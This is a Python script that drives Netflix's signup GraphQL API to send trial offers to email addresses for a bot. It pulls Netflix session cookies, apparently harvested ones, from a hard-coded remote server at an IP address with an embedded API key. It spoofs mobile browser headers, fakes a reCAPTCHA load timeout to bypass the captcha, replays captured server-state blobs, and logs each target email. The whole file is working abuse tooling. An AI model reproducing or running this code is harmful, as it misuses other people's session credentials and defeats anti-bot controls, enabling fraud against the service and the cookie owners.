# ═══════════════════════════════════════════════════════════════════
# 👿 NETFLIX TRIAL OFFER SENDER — MODIFIED FOR BOT 👿
# ═══════════════════════════════════════════════════════════════════

import json
import requests
import os
import re
import uuid
from datetime import datetime
import time

OUTPUT_FOLDER = ".cache"
if not os.path.exists(OUTPUT_FOLDER):
    os.makedirs(OUTPUT_FOLDER)

# ─── API SERVER ───
_SRV = "http://85.115.209.225:3739"
_APIKEY = "NetflixCookie2026!@#"

def get_cookies():
    """Get Netflix cookies from API server"""
    try:
        headers = {"X-API-Key": _APIKEY}
        response = requests.get(f"{_SRV}/get-cookie", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'cookies' in data:
                content = data['cookies']
                cookies, _ = parse_cookie_content(content)
                return cookies
        return None
    except:
        return None

def parse_cookie_content(content):
    """Parse cookie content from various formats"""
    # Try JSON
    if content.startswith('{') or content.startswith('['):
        cookies = parse_json_cookie(content)
        if cookies and ('NetflixId' in cookies or 'SecureNetflixId' in cookies):
            return cookies, "JSON"
    
    # Try Netscape
    cookies = parse_netscape_cookie(content)
    if cookies and ('NetflixId' in cookies or 'SecureNetflixId' in cookies):
        return cookies, "Netscape"
    
    # Try Simple
    lines = content.split('\n')
    cookies = {}
    for line in lines:
        line = line.strip()
        if '=' in line and not line.startswith('#'):
            parts = line.split('=', 1)
            if len(parts) == 2:
                cookies[parts[0].strip()] = parts[1].strip()
    if cookies and ('NetflixId' in cookies or 'SecureNetflixId' in cookies):
        return cookies, "Simple"
    
    return None, None

def parse_netscape_cookie(cookie_text):
    cookies = {}
    for line in cookie_text.strip().split('\n'):
        line = line.strip()
        if line.startswith('#') or not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    return cookies

def parse_json_cookie(json_text):
    try:
        data = json.loads(json_text)
        cookies = {}
        if isinstance(data, dict):
            for key, value in data.items():
                cookies[key] = str(value)
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    if 'name' in item and 'value' in item:
                        cookies[item['name']] = item['value']
                    elif 'key' in item and 'value' in item:
                        cookies[item['key']] = item['value']
        return cookies
    except:
        return {}

def build_cookie_string(cookies):
    cookie_parts = []
    for name, value in cookies.items():
        cookie_parts.append(f"{name}={value}")
    return "; ".join(cookie_parts)

def extract_flwssn(cookie_string):
    match = re.search(r'flwssn=([^;]+)', cookie_string)
    if match:
        return match.group(1)
    return str(uuid.uuid4())

def extract_gsid(cookie_string):
    match = re.search(r'gsid=([^;]+)', cookie_string)
    if match:
        return match.group(1)
    return str(uuid.uuid4())

def generate_request_id():
    return uuid.uuid4().hex[:32]

def generate_toplevel_uuid():
    return str(uuid.uuid4())

def send_trial_offer(email, cookie_string):
    """Send trial offer to email using Netflix GraphQL API"""
    flwssn = extract_flwssn(cookie_string)
    gsid = extract_gsid(cookie_string)
    
    base_headers = {
        'authority': 'web.prod.cloud.netflix.com',
        'accept': '*/*',
        'accept-language': 'en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://www.netflix.com',
        'referer': 'https://www.netflix.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
    
    results = {}
    
    try:
        headers = base_headers.copy()
        headers.update({
            'content-type': 'application/json',
            'cookie': cookie_string,
            'x-netflix.context.app-version': 'v38c5b0da',
            'x-netflix.context.form-factor': 'phone',
            'x-netflix.context.is-inapp-browser': 'false',
            'x-netflix.context.locales': 'en-in',
            'x-netflix.context.operation-name': 'CLCSWebInitSignup',
            'x-netflix.context.ui-flavor': 'akira',
            'x-netflix.request.attempt': '1',
            'x-netflix.request.clcs.bucket': 'high',
            'x-netflix.request.client.context': '{"appstate":"foreground"}',
            'x-netflix.request.id': generate_request_id(),
            'x-netflix.request.originating.url': 'https://www.netflix.com/in/',
            'x-netflix.request.toplevel.uuid': generate_toplevel_uuid()
        })
        
        data = {
            "operationName": "CLCSWebInitSignup",
            "variables": {
                "inputNode": "WELCOME",
                "locale": "en-IN",
                "inputFields": [
                    {"name": "flwssn", "value": {"stringValue": flwssn}},
                    {"name": "email", "value": {"stringValue": email}},
                    {"name": "recaptchaError", "value": {"stringValue": "LOAD_TIMED_OUT"}},
                    {"name": "recaptchaResponseTime", "value": {}},
                    {"name": "recaptchaSiteKey", "value": {"stringValue": "6LdqW_EqAAAAAO87Fb_kcZfNzs0IqJRcKiJDYpUv"}},
                    {"name": "recaptchaToken", "value": {}}
                ]
            },
            "extensions": {
                "persistedQuery": {
                    "id": "5d76d6a0-ccfe-4c31-b587-b4e1954732ca",
                    "version": 102
                }
            }
        }
        
        response = requests.post('https://web.prod.cloud.netflix.com/graphql', 
                                headers=headers, json=data, timeout=10)
        results['init'] = {'status': response.status_code}
        if response.status_code != 200:
            return results, False
    except:
        return results, False
    
    try:
        headers = base_headers.copy()
        headers.update({
            'content-type': 'application/json',
            'cookie': cookie_string,
            'x-netflix.context.app-version': 'v38c5b0da',
            'x-netflix.context.form-factor': 'phone',
            'x-netflix.context.is-inapp-browser': 'false',
            'x-netflix.context.locales': 'en-in',
            'x-netflix.context.operation-name': 'CLCSScreenUpdate',
            'x-netflix.context.ui-flavor': 'akira',
            'x-netflix.request.attempt': '1',
            'x-netflix.request.clcs.bucket': 'high',
            'x-netflix.request.client.context': '{"appstate":"foreground"}',
            'x-netflix.request.id': generate_request_id(),
            'x-netflix.request.originating.url': 'https://www.netflix.com/signup',
            'x-netflix.request.toplevel.uuid': generate_toplevel_uuid()
        })
        
        data = {
            "operationName": "CLCSScreenUpdate",
            "variables": {
                "format": "HTML",
                "imageFormat": "PNG",
                "locale": "en-IN",
                "serverState": "Bgjru+vcAxLTAf/qOOEwXPLVxW+7Jod9WpjYuKN8j1qfhQpzCK4mmQts5eMSeaP+l7s6NKcNBO4rmYabFFCVnMpCH3ib4AicvXAKm30Z+s5W3Cst0D0BK5x/pwn3QmByi/OgGwU/fzaiR5oxSlZe4fKVexWHISkE4GMzJqLaaXQR0M73ynZB9idNBfqsz3RA5WJN+DGAbVUOZlWl8eZqffvQpp/5MGubeQFpdwKqkAx1nHh7/xI1i9tDU0KLgrvkZrbe6nQ1MX2nc9TBxqnVVxtc3ptHdqydP1wlIu0YBiIOCgydgLg1SvK6tSPOff8=",
                "serverScreenUpdate": "Bgjru+vcAxKSAjDnHOxlaIbFSbwaWzZo/REHFnNG7OtpcXdKTDlcL4/o+huGi/fNW+jrqNDqDSsv1iytiG/ZtvO9ierUE9M1Kc/yEj9JsSiG3XpPciFDzPd6psSaG68XLbos+Qie0wniXCtJyWDLDuLd9ayCMB8qGCxwbov6B41kCQY/zArwlecm0GNoJdd5jvZfBJVtytD6mMCYnPA/9zhX4okj+6IGet9xOCYt76IDiuyESxgKbaOLcd6DQIDSBf4m/lYi2Tasj7olPkCaDIXxjU+0UY+b7eDyhvi2if2vt6510ARrGsSZq8DaazQmrpAbfiCW47s1/1mR59vUMYeT8VCqqAvbNwipqyP1DQMHtoTnCoWns0+x6IgYBiIOCgx9EW4i3i9SUswnHEg=",
                "inputFields": [
                    {"name": "email", "value": {"stringValue": email}},
                    {"name": "pipcConsent", "value": {"booleanValue": False}}
                ]
            },
            "extensions": {
                "persistedQuery": {
                    "id": "0fd81de7-07af-4c7d-802f-0f4ea4181aa3",
                    "version": 102
                }
            }
        }
        
        response = requests.post('https://web.prod.cloud.netflix.com/graphql', 
                                headers=headers, json=data, timeout=10)
        results['update'] = {'status': response.status_code}
    except:
        pass

    try:
        headers = {
            'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
            'Accept-Language': 'en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Referer': 'https://www.netflix.com/',
            'Sec-Fetch-Dest': 'image',
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
        
        image_url = 'https://occ-0-6711-64.1.nflxso.net/dnm/api/v6/QqNdfvCShgtu-ra1rla_KxCcSSY/AAAAQAmpros-eVHttd-jyVbIiMTW885cisEwMOLTGkTzHQifWIkevLiCu24tEsptsw.png?r=bff'
        response = requests.get(image_url, headers=headers, timeout=10)
        results['image'] = {'status': response.status_code}
        
        if response.status_code == 200:
            return results, True
        return results, False
    except:
        return results, False

def send_trial(email):
    """Main function to send trial offer"""
    cookies = get_cookies()
    if not cookies:
        return False, "Service unavailable. Please try again later."
    
    cookie_string = build_cookie_string(cookies)
    results, success = send_trial_offer(email, cookie_string)
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{OUTPUT_FOLDER}/log_{timestamp}.json"
    with open(filename, 'w') as f:
        json.dump({
            'email': email,
            'success': success,
            'timestamp': timestamp
        }, f, indent=2)
    
    if success:
        return True, "Trial offer sent successfully! Check your email."
    else:
        return False, "Failed to send trial offer. Please try again."
